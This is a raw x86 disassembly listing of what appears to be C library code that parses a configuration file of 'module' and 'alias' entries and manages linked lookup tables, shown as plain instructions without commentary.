jmp 0x805676b
mov eax, dword [arg_ch]
mov edx, dword [arg_8h]
mov dword [eax], 0
mov dword [edx], 0
jmp 0x80567d3
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
mov edi, eax
push esi
mov esi, edx
push ebx
dec esi
sub esp, 0xc
test edx, edx
mov dword [var_14h], 0
mov dword [var_10h], edx
je 0x805691b
lea esi, [esi]
mov eax, esi
shl eax, 4
sub eax, esi
lea ebx, [edi + eax*4]
mov eax, dword [ebx + 8]
inc eax
mov dword [ebx + 8], eax
dec eax
je 0x8056926
mov eax, esi
dec esi
test eax, eax
jne 0x8056900
mov eax, dword [var_14h]
add esp, 0xc
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [ebx + 4]
test eax, eax
jne 0x8056944
mov eax, dword [ebx + 0x1c]
test eax, eax
je 0x8056914
mov dword [esp], eax
call fcn.08083520
mov dword [esp], ebx
call dword [ebx + 0x1c]
jmp 0x8056914
call fcn.0805d1a0
test eax, eax
mov edx, eax
mov dword [ebx], eax
je 0x805696c
mov eax, dword [eax + 0xc]
mov dword [ebx + 0x18], 0
mov dword [ebx + 0x14], eax
mov eax, dword [edx + 0x10]
mov dword [ebx + 0x1c], eax
mov eax, dword [edx + 0x14]
mov dword [ebx + 0x20], eax
jmp 0x805692d
dec dword [ebx + 8]
inc esi
cmp esi, dword [var_10h]
jae 0x805698f
mov eax, esi
shl eax, 4
sub eax, esi
lea ebx, [edi + eax*4]
mov eax, ebx
inc esi
add ebx, 0x3c
call fcn.08056690
cmp esi, dword [var_10h]
jb 0x805697f
mov dword [var_14h], 1
jmp 0x805691b
nop
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x38
test edx, edx
mov dword [var_2ch], 0x7fffffff
mov dword [var_14h], edx
mov dword [var_10h], eax
mov dword [var_18h], ecx
mov edx, eax
mov dword [var_24h], 0
mov dword [var_28h], 0x7fffffff
mov eax, dword [arg_8h]
cmovne edx, dword [var_14h]
test eax, eax
mov eax, ecx
mov ecx, dword [arg_10h]
cmovne eax, dword [arg_8h]
mov dword [esp], ecx
mov ecx, dword [arg_ch]
call fcn.08056580
sub esp, 4
mov dword [var_30h], eax
test eax, eax
je 0x8056e66
mov eax, dword [arg_8h]
test eax, eax
je 0x8056e19
sub esp, 0x2c
mov eax, dword [arg_8h]
lea ebx, [var_17h]
and ebx, 0xfffffff0
mov dword [ebx], eax
mov dword [esp], eax
call fcn.08053400
mov edx, dword [var_18h]
sub esp, 0x2c
mov dword [ebx + 4], eax
mov dword [ebx + 0xc], 0
mov dword [ebx + 8], 0
mov dword [ebx + 0x10], 0
mov dword [ebx + 0x14], 0
mov dword [ebx + 0x18], 0
mov dword [var_1ch], ebx
lea ebx, [var_17h_2]
and ebx, 0xfffffff0
mov dword [ebx], edx
mov dword [esp], edx
call fcn.08053400
mov ecx, dword [var_1ch]
mov dword [ebx + 0x18], 0
mov dword [ebx + 4], eax
mov dword [ebx + 0xc], 0
mov dword [ebx + 8], 0
mov dword [ebx + 0x10], 0
mov dword [ebx + 0x14], 0
mov dword [ecx + 0x18], ebx
add ebx, 0x18
mov dword [var_20h], ebx
mov edi, dword [var_1ch]
test edi, edi
je 0x8056b58
mov ecx, dword [var_28h]
cmp dword [edi + 0xc], ecx
jle 0x8056b6c
mov edi, dword [edi + 0x18]
test edi, edi
jne 0x8056a95
mov eax, dword [var_24h]
test eax, eax
je 0x8056b58
mov ecx, dword [var_24h]
mov edx, dword [ecx + 0x18]
test edx, edx
je 0x8056acb
mov eax, dword [ecx + 0xc]
cmp dword [edx + 0xc], eax
jl 0x8056b50
je 0x8056b44
mov eax, dword [arg_8h]
mov edi, dword [var_14h]
mov ecx, dword [var_18h]
mov edx, dword [var_10h]
test eax, eax
mov eax, dword [arg_10h]
cmovne ecx, dword [arg_8h]
test edi, edi
cmovne edx, dword [var_14h]
mov dword [var_4h], eax
mov eax, dword [arg_ch]
mov dword [esp], eax
mov eax, dword [var_24h]
call fcn.080566e0
sub esp, 8
mov dword [var_30h], eax
mov esi, dword [var_14h]
mov eax, dword [var_10h]
mov ecx, dword [arg_10h]
mov ebx, dword [arg_8h]
mov edx, dword [var_18h]
test esi, esi
cmovne eax, dword [var_14h]
test ebx, ebx
cmovne edx, dword [arg_8h]
mov dword [var_10h], eax
mov eax, dword [ecx]
mov dword [var_18h], edx
mov edx, dword [var_10h]
mov dword [esp], eax
mov eax, dword [arg_ch]
mov ecx, dword [eax]
mov eax, dword [var_18h]
call fcn.080565e0
sub esp, 4
mov eax, dword [var_30h]
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret 0xc
mov eax, dword [ecx + 8]
cmp dword [edx + 8], eax
jge 0x8056acb
mov dword [var_24h], edx
jmp 0x8056acb
mov edx, dword [arg_ch]
mov ecx, dword [arg_10h]
mov dword [edx], 0
mov dword [ecx], 0
jmp 0x8056afe
je 0x8056e08
mov ebx, dword [0x80aac84]
test ebx, ebx
je 0x8056aa1
mov eax, dword [ebx]
mov dword [var_4h], eax
mov eax, dword [edi]
mov dword [esp], eax
call fcn.08076e50
test eax, eax
je 0x8056ba7
jl 0x8056ba2
mov ebx, dword [ebx + 0x1c]
test ebx, ebx
jne 0x8056b80
jmp 0x8056aa1
mov ebx, dword [ebx + 0x14]
jmp 0x8056b99
mov dword [var_34h], ebx
lea esi, [esi]
mov edx, dword [var_34h]
mov eax, dword [edx + 4]
cmp byte [eax], 0x2d
jne 0x8056e01
cmp byte [eax + 1], 0
jne 0x8056e01
mov eax, dword [var_14h]
mov esi, dword [var_10h]
test eax, eax
cmovne esi, dword [var_14h]
mov eax, dword [var_34h]
mov ecx, dword [edi + 0xc]
mov edx, dword [edi + 8]
mov eax, dword [eax + 8]
add ecx, eax
mov eax, dword [var_10h]
mov dword [var_38h], ecx
mov ecx, dword [var_34h]
mov ecx, dword [ecx + 0xc]
mov dword [esp], esi
mov dword [var_4h], eax
add edx, ecx
mov dword [var_3ch], edx
call fcn.08076e50
test eax, eax
je 0x8056c26
mov eax, dword [var_14h]
test eax, eax
je 0x8056ce1
mov edx, dword [var_14h]
mov dword [esp], esi
mov dword [var_4h], edx
call fcn.08076e50
test eax, eax
jne 0x8056ce1
mov ebx, dword [var_24h]
test ebx, ebx
je 0x8056c49
lea esi, [esi]
mov eax, dword [ebx]
mov dword [esp], esi
mov dword [var_4h], eax
call fcn.08076e50
test eax, eax
je 0x8056cb4
mov ebx, dword [ebx + 0x18]
test ebx, ebx
jne 0x8056c30
sub esp, 0x2c
lea ebx, [var_17h_2]
and ebx, 0xfffffff0
mov dword [ebx], esi
mov dword [esp], esi
call fcn.08053400
mov dword [ebx + 0x14], edi
mov edx, dword [var_34h]
mov ecx, dword [var_38h]
mov dword [ebx + 4], eax
mov eax, dword [var_3ch]
mov dword [ebx + 0x10], edx
mov dword [ebx + 0xc], ecx
mov dword [ebx + 8], eax
mov ecx, dword [var_24h]
mov dword [var_24h], ebx
mov dword [ebx + 0x18], ecx
mov ecx, dword [var_28h]
cmp dword [var_38h], ecx
jl 0x8056ca6
je 0x8056c9e
mov eax, dword [var_34h]
mov eax, dword [eax + 0x18]
test eax, eax
mov dword [var_34h], eax
jne 0x8056bb0
jmp 0x8056aa1
mov eax, dword [var_2ch]
cmp dword [var_3ch], eax
jge 0x8056c88
mov edx, dword [var_38h]
mov ecx, dword [var_3ch]
mov dword [var_28h], edx
mov dword [var_2ch], ecx
jmp 0x8056c88
test ebx, ebx
je 0x8056c49
mov eax, dword [var_38h]
cmp dword [ebx + 0xc], eax
jg 0x8056cca
jne 0x8056c7e
mov edx, dword [var_3ch]
cmp dword [ebx + 8], edx
jle 0x8056c7e
mov ecx, dword [var_34h]
mov eax, dword [var_38h]
mov dword [ebx + 0x14], edi
mov edx, dword [var_3ch]
mov dword [ebx + 0x10], ecx
mov dword [ebx + 0xc], eax
mov dword [ebx + 8], edx
jmp 0x8056c7e
mov eax, dword [var_28h]
cmp dword [var_38h], eax
jl 0x8056cf3
jne 0x8056c88
mov edx, dword [var_2ch]
cmp dword [var_3ch], edx
jge 0x8056c88
mov ebx, dword [var_1ch]
test ebx, ebx
je 0x8056d19
lea esi, [esi]
mov eax, dword [ebx]
mov dword [esp], esi
mov dword [var_4h], eax
call fcn.08076e50
test eax, eax
je 0x8056d5c
mov ebx, dword [ebx + 0x18]
test ebx, ebx
jne 0x8056d00
sub esp, 0x2c
lea ebx, [var_17h_2]
and ebx, 0xfffffff0
mov dword [ebx], esi
mov dword [esp], esi
call fcn.08053400
mov dword [ebx + 0x18], 0
mov dword [ebx + 0x14], edi
mov ecx, dword [var_38h]
mov dword [ebx + 4], eax
mov edx, dword [var_34h]
mov eax, dword [var_3ch]
mov dword [ebx + 0xc], ecx
mov dword [ebx + 0x10], edx
mov ecx, dword [var_20h]
mov dword [ebx + 8], eax
mov dword [ecx], ebx
add ebx, 0x18
mov dword [var_20h], ebx
jmp 0x8056c88
test ebx, ebx
je 0x8056d19
mov eax, dword [var_38h]
cmp dword [ebx + 0xc], eax
jg 0x8056d7a
jne 0x8056c88
mov edx, dword [var_3ch]
cmp dword [ebx + 8], edx
jle 0x8056c88
mov ecx, dword [var_34h]
mov dword [ebx + 0x14], edi
mov dword [ebx + 0x10], ecx
mov ebx, dword [var_1ch]
test ebx, ebx
je 0x8056dbe
mov eax, dword [ebx + 0x10]
test eax, eax
je 0x8056db7
mov edx, dword [ebx + 0x14]
mov ecx, dword [eax + 8]
mov esi, dword [eax + 0xc]
mov eax, dword [edx + 0x10]
test eax, eax
je 0x8056db1
mov edx, dword [edx + 0x14]
add ecx, dword [eax + 8]
add esi, dword [eax + 0xc]
mov eax, dword [edx + 0x10]
test eax, eax
jne 0x8056da1
mov dword [ebx + 0xc], ecx
mov dword [ebx + 8], esi
mov ebx, dword [ebx + 0x18]
test ebx, ebx
jne 0x8056d8a
mov ebx, dword [var_24h]
test ebx, ebx
je 0x8056c88
mov edx, dword [ebx + 0x10]
mov eax, dword [ebx + 0x14]
mov ecx, dword [eax + 0xc]
mov eax, dword [eax + 8]
add ecx, dword [edx + 8]
mov dword [ebx + 0xc], ecx
add eax, dword [edx + 0xc]
cmp ecx, dword [var_28h]
mov dword [ebx + 8], eax
jl 0x8056df9
je 0x8056df4
mov ebx, dword [ebx + 0x18]
test ebx, ebx
jne 0x8056dc9
jmp 0x8056c88
cmp eax, dword [var_2ch]
jge 0x8056de8
mov dword [var_28h], ecx
mov dword [var_2ch], eax
jmp 0x8056de8
mov esi, eax
jmp 0x8056bd5
mov eax, dword [var_2ch]
cmp dword [edi + 8], eax
jge 0x8056aa1
jmp 0x8056b72
sub esp, 0x2c
mov eax, dword [var_18h]
lea ebx, [var_17h]
and ebx, 0xfffffff0
mov dword [ebx], eax
mov dword [esp], eax
call fcn.08053400
mov edx, ebx
mov dword [var_1ch], ebx
add edx, 0x18
mov dword [ebx + 4], eax
mov dword [ebx + 0xc], 0
mov dword [ebx + 8], 0
mov dword [ebx + 0x10], 0
mov dword [ebx + 0x14], 0
mov dword [ebx + 0x18], 0
mov dword [var_20h], edx
jmp 0x8056a8a
mov eax, dword [arg_10h]
mov ecx, dword [arg_ch]
mov edx, dword [eax]
mov eax, dword [ecx]
call fcn.080568e0
jmp 0x8056b3a
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x14
mov eax, dword [arg_8h]
mov dword [var_8h], fcn.08056520
mov dword [var_4h], 0x80aaca0
mov dword [var_bp_8h], eax
lea eax, [var_bp_8h]
mov dword [esp], eax
call fcn.0807a2c0
xor edx, edx
test eax, eax
je 0x8056eb2
mov eax, dword [eax]
mov edx, dword [eax + 4]
mov eax, edx
leave
ret
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0x14
mov dword [var_4h], esi
mov dword [var_8h], ebx
mov esi, eax
mov eax, 0
mov ebx, edx
test eax, eax
je 0x8056f33
mov dword [var_sp_4h], fcn.08057c50
mov dword [esp], 0x80aa860
call section.
lea ecx, [var_ch]
mov edx, ebx
mov eax, esi
call fcn.0805cd30
test eax, eax
jne 0x8056f08
mov eax, dword [var_ch]
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
mov dword [esp], ebx
call fcn.08056e80
mov dword [esp], esi
test eax, eax
cmovne ebx, eax
call fcn.08056e80
test eax, eax
mov dword [var_sp_4h], ebx
cmovne esi, eax
mov dword [esp], esi
call fcn.08076e50
mov dword [var_ch], eax
jmp 0x8056efd
mov edx, dword [0x80aa860]
test edx, edx
jne 0x8056eed
call fcn.08057c50
mov dword [0x80aa860], 2
jmp 0x8056eed
mov esi, esi
push ebp
mov ebp, esp
push edi
mov edi, eax
push esi
mov eax, 0
mov esi, edx
push ebx
sub esp, 0x14
test eax, eax
mov dword [var_10h], ecx
je 0x80570e1
mov dword [var_4h], fcn.08057c50
mov dword [esp], 0x80aa860
call section.
mov eax, 0
test eax, eax
je 0x8056f96
mov dword [esp], 0x80aac88
call section.
mov eax, dword [arg_ch]
mov ecx, dword [var_10h]
mov edx, esi
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
mov eax, edi
call fcn.0805cda0
sub esp, 8
mov ebx, eax
cmp eax, 2
je 0x8056fda
mov eax, 0
test eax, eax
je 0x8056fce
mov dword [esp], 0x80aac88
call section.
mov eax, ebx
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret 8
mov eax, dword [0x80aac84]
test eax, eax
jne 0x8056fff
mov eax, 0
test eax, eax
je 0x8056ff8
mov dword [esp], 0x80aac88
call section.
mov eax, 1
jmp 0x8056fd0
mov dword [esp], esi
call fcn.08056e80
mov dword [esp], edi
mov dword [var_14h], eax
call fcn.08056e80
test byte [arg_ch], 1
mov ebx, eax
jne 0x805706f
mov eax, dword [arg_8h]
mov edx, ebx
mov ecx, esi
mov dword [var_8h], eax
mov eax, dword [var_10h]
mov dword [var_4h_2], eax
mov eax, dword [var_14h]
mov dword [esp], eax
mov eax, edi
call fcn.080569a0
mov ebx, eax
sub esp, 0xc
mov eax, 0
test eax, eax
je 0x8057053
mov dword [esp], 0x80aac88
call section.
test ebx, ebx
mov eax, ebx
jne 0x8056fd0
mov eax, dword [var_10h]
mov ecx, dword [eax]
test ecx, ecx
sete al
movzx eax, al
jmp 0x8056fd0
mov dword [var_4h_2], esi
mov dword [esp], edi
call fcn.08076e50
test eax, eax
je 0x8056fe3
test ebx, ebx
je 0x805709b
mov dword [var_4h_2], esi
mov dword [esp], ebx
call fcn.08076e50
test eax, eax
je 0x8056fe3
mov eax, dword [var_14h]
test eax, eax
je 0x805701a
mov eax, dword [var_14h]
mov dword [esp], edi
mov dword [var_4h_2], eax
call fcn.08076e50
test eax, eax
je 0x8056fe3
test ebx, ebx
je 0x805701a
mov eax, dword [var_14h]
mov dword [esp], ebx
mov dword [var_4h_2], eax
call fcn.08076e50
test eax, eax
jne 0x805701a
jmp 0x8056fe3
mov eax, dword [0x80aa860]
test eax, eax
jne 0x8056f81
call fcn.08057c50
mov dword [0x80aa860], 2
jmp 0x8056f81
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xc
mov dword [var_14h], edx
mov dword [var_10h], eax
mov eax, 0
test eax, eax
je 0x8057134
mov dword [esp], 0x80aac88
call section.
mov edi, dword [var_14h]
mov eax, dword [var_14h]
dec edi
test eax, eax
je 0x8057161
mov eax, edi
mov edx, dword [var_10h]
shl eax, 4
sub eax, edi
lea esi, [edx + eax*4]
lea esi, [esi]
mov ebx, edi
mov eax, esi
dec edi
call fcn.08056690
sub esi, 0x3c
test ebx, ebx
jne 0x8057150
mov eax, dword [var_10h]
mov edx, dword [var_14h]
call fcn.0805d140
mov eax, 0
test eax, eax
je 0x8057181
mov dword [esp], 0x80aac88
call section.
add esp, 0xc
xor eax, eax
pop ebx
pop esi
pop edi
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push esi
mov esi, eax
push ebx
sub esp, 8
mov ebx, dword [0x80aac84]
test ebx, ebx
je 0x80571f4
mov eax, dword [ebx]
mov dword [esp], esi
mov dword [var_4h], eax
call fcn.08076e50
mov edx, 1
test eax, eax
je 0x80571fb
jl 0x8057204
mov ebx, dword [ebx + 0x1c]
test ebx, ebx
jne 0x80571d4
xor edx, edx
test ebx, ebx
setne dl
add esp, 8
mov eax, edx
pop ebx
pop esi
leave
ret
mov ebx, dword [ebx + 0x14]
jmp 0x80571f0
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x10
mov esi, dword [0x80a99f4]
mov ecx, dword [arg_8h]
movzx edx, byte [ecx]
movsx eax, dl
test byte [esi + eax*2 + 1], 0x20
je 0x805723e
nop
inc ecx
movzx edx, byte [ecx]
movsx eax, dl
test byte [esi + eax*2 + 1], 0x20
jne 0x8057230
test dl, dl
mov dword [var_10h], ecx
mov edi, ecx
je 0x8057300
movsx ebx, dl
test byte [esi + ebx*2 + 1], 0x20
jne 0x805727e
mov edx, dword [0x80a99fc]
mov eax, edi
inc ecx
inc edi
mov edx, dword [edx + ebx*4]
mov byte [eax], dl
movzx edx, byte [ecx]
test dl, dl
je 0x8057300
mov eax, dword [0x80a99f4]
movsx ebx, dl
test byte [eax + ebx*2 + 1], 0x20
je 0x8057255
test dl, dl
je 0x8057300
inc ecx
mov byte [edi], 0
mov ebx, dword [0x80a99f4]
movzx edx, byte [ecx]
inc edi
mov esi, ecx
movsx eax, dl
test byte [ebx + eax*2 + 1], 0x20
je 0x80572ae
lea esi, [esi]
inc ecx
movzx edx, byte [ecx]
movsx eax, dl
test byte [ebx + eax*2 + 1], 0x20
jne 0x80572a0
test dl, dl
je 0x80572e7
movsx eax, dl
test byte [ebx + eax*2 + 1], 0x20
jne 0x80572e7
mov ebx, eax
mov esi, esi
mov edx, dword [0x80a99fc]
mov eax, edi
inc ecx
inc edi
mov edx, dword [edx + ebx*4]
mov byte [eax], dl
movzx eax, byte [ecx]
test al, al
je 0x80572e7
movsx eax, al
mov ebx, eax
mov eax, dword [0x80a99f4]
test byte [eax + ebx*2 + 1], 0x20
je 0x80572c0
cmp esi, edi
je 0x8057300
mov byte [edi], 0
mov eax, dword [var_10h]
inc edi
call fcn.080571c0
test eax, eax
je 0x8057308
nop
lea esi, [esi]
add esp, 0x10
pop ebx
pop esi
pop edi
leave
ret
sub edi, dword [var_10h]
lea eax, [edi + 8]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov ebx, eax
je 0x8057300
mov dword [var_8h], edi
lea eax, [eax + 8]
mov edx, dword [var_10h]
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.08053770
sub esi, dword [var_10h]
mov dword [ebx], eax
add eax, esi
mov dword [ebx + 4], eax
mov dword [esp], ebx
mov dword [var_4h], 0x80aaca0
mov dword [var_8h], fcn.08056520
call fcn.0807a190
test eax, eax
je 0x805735c
cmp dword [eax], ebx
je 0x8057300
mov dword [arg_8h], ebx
add esp, 0x10
pop ebx
pop esi
pop edi
leave
jmp fcn.08051180
nop
lea esi, [esi]
push ebp
mov ebp, esp
push edi
mov edi, eax
push esi
push ebx
sub esp, 0x10
mov eax, dword [0x80aac84]
mov dword [var_14h], 0x80aac84
mov dword [var_10h], edx
test eax, eax
je 0x80573c2
mov ebx, eax
mov eax, dword [ebx]
mov esi, ebx
mov dword [var_4h], eax
mov eax, dword [edi]
mov dword [esp], eax
call fcn.08076e50
test eax, eax
mov edx, eax
je 0x80573cf
lea eax, [ebx + 0x14]
test edx, edx
mov dword [var_14h], eax
lea eax, [ebx + 0x1c]
cmovs eax, dword [var_14h]
mov dword [var_14h], eax
mov eax, dword [eax]
test eax, eax
mov ebx, eax
jne 0x8057390
mov eax, dword [var_14h]
mov dword [eax], edi
add esp, 0x10
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [esi]
mov dword [var_4h], eax
mov eax, dword [edi]
mov dword [esp], eax
call fcn.08076e50
test eax, eax
jne 0x80573f9
mov eax, dword [esi + 4]
mov dword [var_4h], eax
mov eax, dword [edi + 4]
mov dword [esp], eax
call fcn.08076e50
test eax, eax
je 0x8057408
lea eax, [esi + 0x18]
mov esi, dword [esi + 0x18]
mov dword [var_14h], eax
test esi, esi
jne 0x80573cf
jmp 0x80573c2
test esi, esi
je 0x80573c2
mov eax, dword [esi + 8]
cmp dword [edi + 8], eax
jl 0x805742f
je 0x8057427
mov eax, dword [var_10h]
test eax, eax
je 0x80573c7
mov dword [esp], edi
call fcn.08051180
jmp 0x80573c7
mov eax, dword [esi + 0xc]
cmp dword [edi + 0xc], eax
jge 0x8057416
mov eax, dword [esi + 0x14]
mov edx, dword [var_14h]
mov dword [edi + 0x14], eax
mov eax, dword [esi + 0x1c]
mov dword [edi + 0x1c], eax
mov eax, dword [esi + 0x18]
mov dword [edi + 0x18], eax
mov dword [edx], edi
mov dword [esp], esi
jmp 0x8057420
nop
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
mov ebx, eax
sub esp, 0x3c
mov dword [var_20h], ecx
mov dword [var_1ch], edx
movzx ecx, byte [eax]
mov edx, dword [0x80a99f4]
mov esi, edx
movsx eax, cl
test byte [edx + eax*2 + 1], 0x20
je 0x8057484
inc ebx
movzx ecx, byte [ebx]
movsx eax, cl
test byte [esi + eax*2 + 1], 0x20
jne 0x8057476
test cl, cl
mov dword [var_24h], ebx
je 0x8057690
movsx edx, cl
test byte [esi + edx*2 + 1], 0x20
jne 0x80574c5
lea esi, [esi]
mov eax, dword [0x80a99fc]
mov eax, dword [eax + edx*4]
mov byte [ebx], al
inc ebx
movzx ecx, byte [ebx]
test cl, cl
je 0x8057690
mov eax, dword [0x80a99f4]
movsx edx, cl
test byte [eax + edx*2 + 1], 0x20
je 0x80574a0
test cl, cl
je 0x8057690
mov byte [ebx], 0
mov edx, dword [0x80a99f4]
inc ebx
mov dword [var_38h], ebx
mov dword [var_28h], ebx
movzx ecx, byte [ebx]
movsx eax, cl
test byte [edx + eax*2 + 1], 0x20
je 0x80574fe
lea esi, [esi]
inc ebx
movzx ecx, byte [ebx]
movsx eax, cl
test byte [edx + eax*2 + 1], 0x20
jne 0x80574f0
test cl, cl
je 0x8057690
movsx eax, cl
test byte [edx + eax*2 + 1], 0x20
jne 0x8057540
mov esi, eax
mov edx, dword [0x80a99fc]
mov eax, dword [var_38h]
inc ebx
inc dword [var_38h]
mov edx, dword [edx + esi*4]
mov byte [eax], dl
movzx ecx, byte [ebx]
test cl, cl
je 0x8057690
movsx eax, cl
mov esi, eax
mov eax, dword [0x80a99f4]
test byte [eax + esi*2 + 1], 0x20
je 0x8057512
test cl, cl
je 0x8057690
mov eax, dword [var_38h]
mov byte [eax], 0
mov edx, dword [0x80a99f4]
inc eax
mov dword [var_38h], eax
inc ebx
movzx ecx, byte [ebx]
movsx eax, cl
test byte [edx + eax*2 + 1], 0x20
jne 0x8057558
mov edx, dword [var_38h]
test cl, cl
mov esi, ecx
mov dword [var_2ch], edx
je 0x805776b
mov edx, dword [var_38h]
mov eax, esi
inc ebx
mov byte [edx], al
inc edx
mov dword [var_38h], edx
movzx ecx, byte [ebx]
test cl, cl
mov esi, ecx
je 0x805776b
mov eax, dword [0x80a99f4]
movsx edx, cl
test byte [eax + edx*2 + 1], 0x20
je 0x8057576
test cl, cl
je 0x805776b
mov eax, dword [var_38h]
mov byte [eax], 0
mov dword [esp], ebx
mov dword [var_8h], 0xa
inc eax
mov dword [var_sp_ch], 0
mov dword [var_38h], eax
lea eax, [var_10h]
mov dword [var_4h], eax
call fcn.080494c0
cmp ebx, dword [var_10h]
mov dword [var_34h], eax
je 0x805775f
test eax, eax
jle 0x805775f
mov edx, dword [var_2ch]
movzx eax, byte [edx]
test al, al
je 0x8057690
cmp al, 0x2f
mov dword [var_30h], 0
mov eax, 0
cmovne eax, dword [var_20h]
mov dword [var_20h], eax
mov eax, dword [var_38h]
sub eax, edx
cmp eax, 3
jle 0x8057627
mov esi, dword [var_38h]
mov eax, 0x8093486
mov ecx, 4
cld
mov edi, eax
sub esi, 4
repe cmpsb byte [esi], byte ptr es:[edi]
je 0x805762e
mov dword [var_30h], 3
mov esi, dword [var_28h]
mov eax, dword [var_24h]
sub esi, dword [var_24h]
mov dword [esp], eax
mov dword [var_4h], esi
call fcn.08076f30
lea edx, [eax + 0x13]
and edx, 0xfffffffc
sub esp, edx
lea edx, [var_1fh]
and edx, 0xfffffff0
mov byte [eax + edx], 0
mov dword [esp], edx
mov edi, dword [var_24h]
mov dword [var_8h], eax
mov dword [var_4h], edi
call fcn.08053770
mov dword [var_4h], 0x80aaca0
mov dword [var_18h], eax
mov dword [var_8h], fcn.08056520
lea eax, [var_18h]
mov dword [esp], eax
call fcn.0807a2c0
test eax, eax
je 0x805769a
nop
lea esi, [esi]
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret 0xc
mov eax, dword [var_38h]
mov edx, dword [var_30h]
mov dword [esp], 1
sub eax, edi
add eax, dword [var_20h]
lea eax, [edx + eax + 0x20]
mov dword [var_4h], eax
call fcn.08051730
test eax, eax
mov ebx, eax
je 0x8057690
lea edx, [eax + 0x20]
mov dword [eax], edx
mov dword [esp], edx
mov dword [var_4h], edi
mov dword [var_8h], esi
call fcn.08053740
mov edi, dword [var_28h]
mov dword [ebx + 4], eax
mov edx, eax
mov eax, dword [var_2ch]
sub eax, dword [var_28h]
mov dword [esp], edx
mov dword [var_4h], edi
mov dword [var_8h], eax
call fcn.08053740
mov esi, dword [var_20h]
mov edx, eax
mov eax, dword [var_34h]
mov dword [ebx + 0x10], edx
test esi, esi
mov dword [ebx + 8], eax
mov eax, dword [arg_10h]
mov dword [ebx + 0xc], eax
jne 0x8057745
mov edi, dword [var_2ch]
mov dword [esp], edx
sub dword [var_38h], edi
mov eax, dword [var_38h]
mov dword [var_4h], edi
mov dword [var_8h], eax
call fcn.08053740
mov ecx, dword [var_30h]
mov edx, eax
test ecx, ecx
je 0x8057734
mov eax, dword [0x8093486]
mov dword [edx - 1], eax
mov edx, 1
mov eax, ebx
call fcn.08057370
jmp 0x8057690
mov edi, dword [var_20h]
mov eax, dword [var_1ch]
mov dword [esp], edx
mov dword [var_8h], edi
mov dword [var_4h], eax
call fcn.08053740
mov edx, eax
jmp 0x805770a
mov dword [var_34h], 1
jmp 0x80575e3
mov edi, dword [var_38h]
mov byte [edi], 0
inc edi
mov dword [var_38h], edi
jmp 0x805775f
mov esi, esi
lea edi, [edi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x28
mov dword [var_1ch], ecx
mov dword [var_18h], edx
mov dword [var_4h], 0x8093820
mov dword [esp], eax
call fcn.0804a250
test eax, eax
mov dword [var_20h], eax
mov dword [var_14h], 0
mov dword [var_10h], 0
je 0x805789d
mov dword [var_4h], 2
mov dword [esp], eax
call fcn.08076c00
mov edx, dword [var_20h]
test byte [edx], 0x10
jne 0x8057887
mov edi, dword [var_20h]
lea eax, [var_10h]
lea edx, [var_14h]
mov dword [var_8h], 0xa
mov dword [var_4h], eax
mov dword [esp], edx
mov dword [var_sp_ch], edi
call fcn.08075470
test eax, eax
mov edi, eax
js 0x8057887
mov ebx, dword [var_14h]
mov dword [var_4h], 0x23
mov dword [esp], ebx
call fcn.08076ce0
test eax, eax
mov esi, eax
je 0x8057917
mov byte [eax], 0
movzx edx, byte [ebx]
mov ecx, dword [0x80a99f4]
movsx eax, dl
test byte [ecx + eax*2 + 1], 0x20
je 0x8057840
inc ebx
movzx edx, byte [ebx]
movsx eax, dl
test byte [ecx + eax*2 + 1], 0x20
jne 0x8057832
cmp ebx, esi
je 0x805787b
test dl, dl
mov dword [var_24h], ebx
je 0x8057867
movsx eax, dl
test byte [ecx + eax*2 + 1], 0x20
jne 0x8057867
inc ebx
movzx eax, byte [ebx]
test al, al
je 0x8057867
movsx eax, al
test byte [ecx + eax*2 + 1], 0x20
je 0x8057855
mov eax, ebx
sub eax, dword [var_24h]
cmp eax, 5
je 0x80578e9
mov eax, ebx
sub eax, dword [var_24h]
cmp eax, 6
je 0x80578a7
mov edi, dword [var_20h]
test byte [edi], 0x10
je 0x80577d4
mov eax, dword [var_14h]
mov dword [esp], eax
call fcn.08051180
mov eax, dword [var_20h]
mov dword [esp], eax
call fcn.08049dc0
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret 8
mov esi, dword [var_24h]
mov eax, str.module
mov ecx, 6
cld
mov edi, eax
repe cmpsb byte [esi], byte ptr es:[edi]
jne 0x805787b
mov eax, dword [0x80aa864]
mov edx, dword [arg_8h]
mov ecx, dword [var_1ch]
mov dword [var_8h], eax
mov dword [esp], edx
inc eax
mov dword [0x80aa864], eax
mov edx, dword [var_18h]
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, ebx
call fcn.08057450
sub esp, 0xc
jmp 0x805787b
mov esi, dword [var_24h]
mov eax, str.alias
mov ecx, 5
cld
mov edi, eax
repe cmpsb byte [esi], byte ptr es:[edi]
jne 0x8057871
mov edx, dword [arg_8h]
mov eax, dword [edx]
mov dword [esp], ebx
mov dword [var_4h], eax
call fcn.08057210
jmp 0x805787b
cmp byte [edi + ebx - 1], 0xa
jne 0x805781f
mov byte [edi + ebx - 1], 0
jmp 0x805781f
lea esi, [esi]
push ebp
mov eax, 0
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x20
test eax, eax
je 0x805794e
